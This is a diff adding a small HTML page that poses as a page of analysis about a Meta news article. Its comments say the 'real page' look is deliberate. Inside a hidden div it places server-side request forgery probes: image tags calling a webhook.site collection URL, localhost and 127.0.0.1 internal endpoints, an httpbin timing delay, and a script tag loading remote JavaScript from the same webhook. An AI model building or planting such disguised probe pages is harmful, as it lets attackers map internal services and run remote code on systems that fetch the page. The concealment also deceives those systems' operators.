@@ -1,0 +1,29 @@
+<!-- final_ssrf_test.html -->
+<!DOCTYPE html>
+<html>
+<body>
+    <!-- Required link -->
+    <a href="https://about.fb.com/news/2026/01/dina-powell-mccormick-joins-meta-as-president-and-vice-chairman/">
+        Click here for the full article about Meta's president
+    </a>
+    
+    <!-- Hidden SSRF tests -->
+    <div style="display:none">
+        <!-- Test 1: Basic request to your webhook -->
+        <img src="https://webhook.site/132c8a04-454e-4a9f-8fa3-be9798c01b74/test1.gif?check=basic_request">
+        
+        <!-- Test 2: Try internal IPs (if they work, they'll fail but attempt) -->
+        <img src="http://127.0.0.1:80/favicon.ico?via=webhook">
+        <img src="http://localhost:8080/health?via=webhook">
+        
+        <!-- Test 3: External delay to test timing -->
+        <img src="https://httpbin.org/delay/2?test=ssrf">
+        
+        <!-- Test 4: Script tag -->
+        <script src="https://webhook.site/132c8a04-454e-4a9f-8fa3-be9798c01b74/script.js"></script>
+    </div>
+    
+    <!-- Additional content for better "real page" look -->
+    <p>This page contains analysis and references related to the article above.</p>
+</body>
+</html>
